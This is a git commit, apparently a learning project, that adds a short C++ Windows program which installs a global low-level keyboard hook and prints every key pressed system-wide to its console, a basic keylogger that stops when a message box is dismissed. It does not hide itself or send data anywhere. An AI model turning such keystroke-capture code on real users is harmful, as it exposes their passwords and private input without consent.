4a2f87a8ee4d7f59c6bbafa426be8f35a28714c2
WhoAmI-FK <Faismen2004@mail.ru>
2022-04-26 17:01:53 +0200

    Base set-up

---
+++ WinApi.cpp
@@ -0,0 +1,29 @@
+﻿#include <iostream>
+#include <Windows.h>
+
+LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
+	if (wParam == WM_KEYDOWN) 
+	{
+		std::cout << char(tolower(p->vkCode));
+	}
+	return CallNextHookEx(NULL,nCode, wParam, lParam);
+}
+
+int main()
+{
+	SetWindowsHookEx(
+	WH_KEYBOARD_LL,
+	keyboardHookProc,
+	NULL,
+	0
+	);
+	MessageBox(NULL, TEXT("PRESS OK to stop logging."), TEXT("Information"), MB_OK);
+	/*while (true)
+	{
+
+	}
+	*/
+	return 0;
+}
